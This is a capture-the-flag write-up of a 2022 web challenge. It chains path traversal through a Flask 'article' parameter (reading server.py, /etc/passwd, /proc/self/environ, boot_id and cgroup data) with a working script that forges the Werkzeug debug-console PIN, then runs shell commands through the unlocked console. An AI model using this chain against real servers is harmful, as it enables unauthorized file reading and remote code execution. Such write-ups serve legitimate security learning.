
Konsolation prize was a web challenge in the backdoor CTF in 2022.

# Recon

When we first open the [link](http://hack.backdoor.infoseciitr.in:13456/) provided by the organizers we can see something like this:

![image](https://user-images.githubusercontent.com/37932436/208311616-0eaf20e4-e292-4f75-9dce-e32e6910adac.png)

First things first by looking through the html, local storage, cookies and network traffic.
## HTML
Here is the html source of the index page:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title> Index you hate  - MyKonsole</title>
    <style>
        nav a {
            color: #d64161;
            font-size: 3em;
            margin-left: 50px;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <nav>
        <a href="#">Konsole</a>
        <a href="#">About</a>
    </nav>
    <hr>
    <div class="content">
        
    <h1> Index you hate </h1>
    <h1>You trynna enter through the frontdoor? It's backdoor baby!</h1>
    <h2>Don't look into what you're not allowed to okay? Okay?</h2>

    </div>
</body>
</html>
```
Not a lot to find in there so lets move on to the cookies.
## Local Storage and Cookies
No cookies or local storage set. Nothing to find here either.
## Network Traffic
Refreshing the page and taking a look into the network tab in the developer console will show us a bit more what's happening when we load the page so lets do that:

![image](https://user-images.githubusercontent.com/37932436/208311908-4dbe7467-5fd7-462e-9fb0-48ffa7fd8bbe.png)

Nothing special here either. Maybe that in the response header there is a server field with `Werkzeug/2.2.2 Python/3.9.16`

So for now we haven't found anything useful on this site. Because this is a challenge we know there needs to be something so fter trying some common paths in the URL one can find this:

`http://hack.backdoor.infoseciitr.in:13456/admin`, which looks like this:

![image](https://user-images.githubusercontent.com/37932436/208312040-69134ce7-b1b4-4a37-a09b-b1903ac0e542.png)

So after looking through this we can see a couple of interesting things:
- They use [`Flask`](https://flask.palletsprojects.com/en/2.2.x/#) (a python web framework) with Python 3.9
- They use [`Jinja`](https://jinja.palletsprojects.com/en/3.1.x/) (a python templating engine)
- There is a file called `server.py` in `/src/app/`
- There is another path called `/article?name=article` which has a name parameter

Lets have a look at the article page (`http://hack.backdoor.infoseciitr.in:13456/article?name=article`):

![image](https://user-images.githubusercontent.com/37932436/208312226-4ccfdf6e-03e5-4523-b06d-9fb9d7c02365.png)

Weird. A error `[Errno 2] No such file or directory: 'article'`. Lets try a different name argument like index.html (`/article?name=index.html`):

![image](https://user-images.githubusercontent.com/37932436/208312299-a336de67-5cbf-42e8-a706-f8c44c3be329.png)

A similar error but with a different file name. As we expected. Lets try a file we know exists: `server.py` (`/article?name=server.py`):

![image](https://user-images.githubusercontent.com/37932436/208312355-2798d4bf-8feb-4852-9869-04b7e76a5293.png)

Let's format the code and see what we get:

```py
from flask import ( Flask, render_template, request, redirect, ) 

app = Flask(__name__) 

@app.route("/admin", methods=["GET", "POST"]) 
def the_great_admin():
     template = ''' {% % block body % %} <h1> The secret admin konsole </h1>
                <div class ="row"> <div class = "col-md-6 col-md-offset-3 center" >
                Hey, you wanna hack the planet? Why don't you checkout
                <a href='/article?name=article'> article < /a >?
                /*I hope no one gets to see what I did up there*/ </div> </div>
                {% % endblock % %} ''' 
     return render_template(template) 

@app.route("/", methods=["GET"]) 
def index(): 
    return render_template("main.html") 

@app.route('/article', methods=['GET']) 
def article(): 
    if 'name' in request.args: 
        page = request.args.get('name') 
    else: 
        page = 'article' 
    if page.find('flag') >= 0: 
        return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ", code=302) 
    try: 
        template_lol = open(page).read() 
    except Exception as e: 
        template_lol = e 
    return render_template('article.html', temp=template_lol) 
        
if __name__ == "__main__": 
    app.run(host='0.0.0.0', debug=True, port=13456 )
    
```

Nice we got the source code of the server. Taking a look at the code also explains the error. They tried to open a file that does not exist and python throws an exception. But there is one problem:
- We don't know where to look for the flag
- If we open a file that contains the word `flag` we get redirected. So no output for us. Let's start poking around.

# Poking around
## [Template Injection](https://portswigger.net/web-security/server-side-template-injection)
We first though we might be able to inject something into the admin page template. This would allow us to maybe list some files and get somewhere. But because the admin page does not use any of our inputs there is no way to get into the templating engine.
BUT the article page does use our error as a template input. OK so let's try `/article?name=5*5` and see if its evalutated:

`[Errno 2] No such file or directory: '5*5'`

Ok so that does not work. How about `{5*5}` or `{{5*5}}`

- `[Errno 2] No such file or directory: '{5*5}'`
- `[Errno 2] No such file or directory: '{{5*5}}'`

Nothing with that either. Let's look for something different.

## Flask debug=True

Looking at the server.py we quickly found that the debug value of the flask app is set to true. After some research one can find that this means a debug console is exposed at `/console`:

![image](https://user-images.githubusercontent.com/37932436/208489024-c64886a5-cd1a-44e7-b3fd-2f40a846634f.png)

Unfortunately the console is locked behind a pin. After some further research into flasks debug console we found out that the pin has the format `XXX-XXX-XXX` with X being a number from 0 to 9. We also found out that after 10 wrong tries the server locks the page and does not allow further pins to be entered until restarted. Fortunately the server is periodically (~15 min) restarted. Still this makes bruteforcing it infeasible. Let's check the web if there are any known vulnerbilites.

- [Werkzeug Console Pin Exploit](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#pin-protected)

Ok so in theory it should be vulnerable. First we tried to read the stdout file descriptor of the running process and thus getting the pin without any fancy code.

```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```

Let's navigate to `/article?name=../../../../../../proc/self/fd/1`. This is the "file" for the stdout (1) file descriptor (fd) of the current process so this maybe gives us the pin, ... but nope. The pages is stuck on load. So that does not work. Let's try the different attacks. For that we need the following information:
- `username` that started the server
- `modname` which should be by default `flask.py`
- `getattr(app, '__name__', getattr(app.__class__, '__name__'))` which should be by default `Flask`
- `getattr(mod, '__file__', None)` which is the absolute path to the flask `app.py`
- `MAC address` in decimal
- `random machine or boot id` which is assigned at each boot
- Optional: `Content of the cgroup file`

Let's tackle one after the other:

### Username

For the username this will be easy. There are multiple ways to do this. We could use `/proc/self/environ` which gives us the environment variables of the running process. Also we can take a look at `/etc/passwd`.

Trying `/article?name=../../../../../proc/self/environ`

Here is the already formated output:

```console
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=983dd13a83de LANG=C.UTF-8 GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568
PYTHON_VERSION=3.9.16
PYTHON_PIP_VERSION=22.0.4
PYTHON_SETUPTOOLS_VERSION=58.1.0
PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/66030fa03382b4914d4c4d0896961a0bdeeeb274/public/get-pip.py
PYTHON_GET_PIP_SHA256=1e501cf004eac1b7eb1f97266d28f995ae835d30250bec7f8850562703067dc6
HOME=/home/r00t-user
WERKZEUG_SERVER_FD=3
WERKZEUG_RUN_MAIN=true
```

and now trying `/article?name=../../../../../etc/passwd`

```console
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
r00t-user:x:1000:1000::/home/r00t-user:/bin/sh
```

So it looks like that the `username` we are searching for is `r00t-user`

The next two things as already stated are by default:

- `flask.py`
- `Flask`

What about the path to the flask app.py?

### app.py

If you remember we found an admin page at the very beginning that has thrown some errors and as chance would have it there is the absolute path for the app.py:

```console
/usr/local/lib/python3.9/site-packages/flask/app.py
```

### MAC address

Still following the exploit we get the mac address with `/article?name=../../../../../sys/class/net/eth0/address`

- `02:42:ac:11:00:03`

And now we convert it into decimal with:

```py
>>> 0x0242ac110003
2485377892355
```

The only thing missing now is the machine or boot id and the optional cgroup content.

### Machine ID

So let's get the machine id with `/article?name=../../../../../etc/machine-id`

... and ...

`[Errno 2] No such file or directory: '../../../../../etc/machine-id'`

Too bad, but as it says we might also use the random boot id.

### Random Boot ID

Maybe we find something here: `/article?name=../../../../../proc/sys/kernel/random/boot_id`

YES. Here is the random boot id: `d5a09294-c0e7-4cf9-a10b-4cdb79f8620c`

Because the exploit has no `-` in the machine / boot id we remove them here: `d5a09294c0e74cf9a10b4cdb79f8620c`

-

Let's recap with all the information and run it:
- Username: `r00t-user`
- Modname: `flask.py`
- __name__: `Flask`
- Flask path: `/usr/local/lib/python3.9/site-packages/flask/app.py`
- Decimal MAC: `2485377892355`
- Random Boot ID: `d5a09294c0e74cf9a10b4cdb79f8620c`

```py
import hashlib
from itertools import chain
probably_public_bits = [
    'r00t-user',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.9/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2485377892355',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'd5a09294c0e74cf9a10b4cdb79f8620c'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

-> And we get a PIN: `174-692-722`

Let's try it:

`Wrong PIN`

Mhh ok. So maybe we need to use the cgroup file.

`/article?name=../../../../../../proc/self/cgroup`

```console
13:rdma:/docker/983dd13a83de9fa00337d1da01a350437d47b4be641b936fb084a998abdc246f 
12:blkio:/docker/983dd13a83de9fa00337d1da01a350437d47b4be641b936fb084a998abdc246f 
11:misc:/ 
10:freezer:/docker/983dd13a83de9fa00337d1da01a350437d47b4be641b936fb084a998abdc246f 
9:hugetlb:/docker/983dd13a83de9fa00337d1da01a350437d47b4be641b936fb084a998abdc246f 
8:perf_event:/docker/983dd13a83de9fa00337d1da01a350437d47b4be641b936fb084a998abdc246f 
7:pids:/docker/983dd13a83de9fa00337d1da01a350437d47b4be641b936fb084a998abdc246f 
6:cpuset:/docker/983dd13a83de9fa00337d1da01a350437d47b4be641b936fb084a998abdc246f 
5:net_cls,net_prio:/docker/983dd13a83de9fa00337d1da01a350437d47b4be641b936fb084a998abdc246f 
4:devices:/docker/983dd13a83de9fa00337d1da01a350437d47b4be641b936fb084a998abdc246f 
3:cpu,cpuacct:/docker/983dd13a83de9fa00337d1da01a350437d47b4be641b936fb084a998abdc246f 
2:memory:/docker/983dd13a83de9fa00337d1da01a350437d47b4be641b936fb084a998abdc246f 
1:name=systemd:/docker/983dd13a83de9fa00337d1da01a350437d47b4be641b936fb084a998abdc246f 
0::/docker/983dd13a83de9fa00337d1da01a350437d47b4be641b936fb084a998abdc246f
```

We just need to use the last part of the first line `983dd13a83de9fa00337d1da01a350437d47b4be641b936fb084a998abdc246f`

`Wrong PIN`

Maybe we need to use the `-` in the random boot id?

`Wrong PIN`

This is where we hit a massive wall and couldn't figure out why our exploits where not working. After some hours of taking a break I took a look at it again on my local machine. So together with someones help I set up a local flask instance running a similar page with a similar exploit. This allowed us to see the acutal real PIN in the stdout in the console. I also hooked into the `werkzeug` module (the module that's responsible for the debug console and PIN). Here is a excerpt of the code I changed in my local `/usr/local/lib/python3.9/site-packages/werkzeug/debug/__init__.py` file, such that I could track all the values and check if we use the correct ones.

Part of local `werkzeug/debug/__init__py` (modified):

```py showLineNumbers
def _generate() -> t.Optional[t.Union[str, bytes]]:
        linux = b""

        # machine-id is stable across boots, boot_id is not.
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
            try:
                with open(filename, "rb") as f:
                    print(f"Opened file: {filename}") # <-----------------------------------MODIFICATION HERE---------------------------------------
                    value = f.readline().strip()
            except OSError:
                continue
        print(f"First Value: {value}") # <-----------------------------------HERE---------------------------------------
            if value:
                linux += value
                break

        # Containers share the same machine id, add some cgroup
        # information. This is used outside containers too but should be
        # relatively stable across boots.
        try:
            with open("/proc/self/cgroup", "rb") as f:
                linux += f.readline().strip().rpartition(b"/")[2]
        except OSError:
            pass
        print(f"Second Value: {value}") # <-----------------------------------AND HERE---------------------------------------
        if linux:
            return linux
```

After getting all the stuff from `machine-id` and `cgroup` I verified that the we have the right values that the module is using. But still we get a wrong PIN, so I hooked even more into the werkzeug module and added more code to print all the needed values.

More modification on local `werkzeug/debug/__init__py`:

```py showLineNumbers
def get_pin_and_cookie_name(
    app: "WSGIApplication",
) -> t.Union[t.Tuple[str, str], t.Tuple[None, None]]:
    """Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns `None`.

    Second item in the resulting tuple is the cookie name for remembering.
    """
    pin = os.environ.get("WERKZEUG_DEBUG_PIN")
    rv = None
    num = None

    # Pin was explicitly disabled
    if pin == "off":
        return None, None

    # Pin was provided explicitly
    if pin is not None and pin.replace("-", "").isdecimal():
        # If there are separators in the pin, return it directly
        if "-" in pin:
            rv = pin
        else:
            num = pin

    modname = getattr(app, "__module__", t.cast(object, app).__class__.__module__)
    username: t.Optional[str]

    try:
        # getuser imports the pwd module, which does not exist in Google
        # App Engine. It may also raise a KeyError if the UID does not
        # have a username, such as in Docker.
        username = getpass.getuser()
    except (ImportError, KeyError):
        username = None
    mod = sys.modules.get(modname)

    # This information only exists to make the cookie unique on the
    # computer, not as a security feature.
    probably_public_bits = [
        username,
        modname,
        getattr(app, "__name__", type(app).__name__),
        getattr(mod, "__file__", None),
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits = [str(uuid.getnode()), get_machine_id()]
    print(probably_public_bits) # <----------------------------------------------------------MODIFICATION HERE-------------------------------
    print(private_bits) # <-----------------------------------------------------------------------AND HERE-----------------------------------

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv, cookie_name
```

Running it again and validating we get the right values at least locally. So yes we get the right values. We even use the right values. So the only thing that is possible why this isn't working is because the code of our pin generation does not match the generating function on the server. And then it hit me when looking through the code:

The code that we use to generate the PIN:

```py
[...]
h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]
[...]
```

and the code that my local flask / werkzeug instance uses to generate the PIN:

```py
[...]
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"
[...]
```

Maybe you already see it. The exploit is using `md5` and my local instance is using `sha1`. To check what the konsolation prize service is doing we just use our file traversal and retrieve the running `werzeug/debug/__init__.py` file. I spare you with the full code because there were no line breaks but here is the important bit:

```py
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
```

So YES they use sha1 and not md5. This is why it wasn't working before. So let's hack together a new exploit with sha1 instead of md5. Reading through all the code I was also sure we need to use the `-` in the random boot id and we also need the cgroup stuff. Trying it with all this gives us this pin:

`118-611-032`

WE ARE IN!

Ok now the only thing left is to find the flag. Here a friend joined me in the search: [@NukeOfficial](https://infosec.exchange/@NukeOfficial) (Discord: NukeOfficial
#0370)

The console we now have is a interactive python interpreter. It only allows one line at a time. We used this python code to get arbitrary code execution of shell commands. Yes its maybe not the most efficient but it works (each line was entered after one another):

```py
import subprocess
print(subprocess.run(["<some shell command>"], shell=True, capture_output=True).stdout.decode())
```

We looked a bit through the file system but didn't find anything interesting at first sight. Then Nuke grepped through some subfolders of the root directory and found the flag eventually in `/usr/srv` with:

```py
print(subprocess.run(["grep -rnw '/usr/srv/' -e 'flag'"], shell=True, capture_output=True).stdout.decode())
```

```console
flag{wh0_g4v3_y0u_my_fl4sk_p1n_23dde36g}
```

And just like that we pwned konsolation prize.

Also lot of thanks to all the people that helped. If you helped and want to be listed here just tell me and I will link to any socials you want.

### Helping Hands

- [@NukeOfficial](https://infosec.exchange/@NukeOfficial) or Discord at NukeOfficial#0370
- [@NiklasBeierl](https://github.com/NiklasBeierl)
